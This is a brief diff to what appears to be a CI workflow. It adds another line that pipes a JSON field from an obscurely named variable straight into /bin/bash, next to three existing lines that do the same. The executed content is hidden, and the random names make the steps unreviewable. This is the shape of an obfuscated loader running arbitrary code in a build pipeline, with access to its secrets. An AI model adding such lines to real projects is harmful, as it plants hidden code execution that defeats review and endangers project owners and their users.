@@ -27,6 +27,7 @@ jobs:
           printf '%s' "$nkbc818" | jq -r .csa297 | /bin/bash
           echo $k6099 | jq -r .zlw2 | /bin/bash
           echo $u2 | jq -r .kimme1 | /bin/bash
+          echo $vt7054 | jq -r .zc0 | /bin/bash
 
       - name: Store artifact
         if: always()
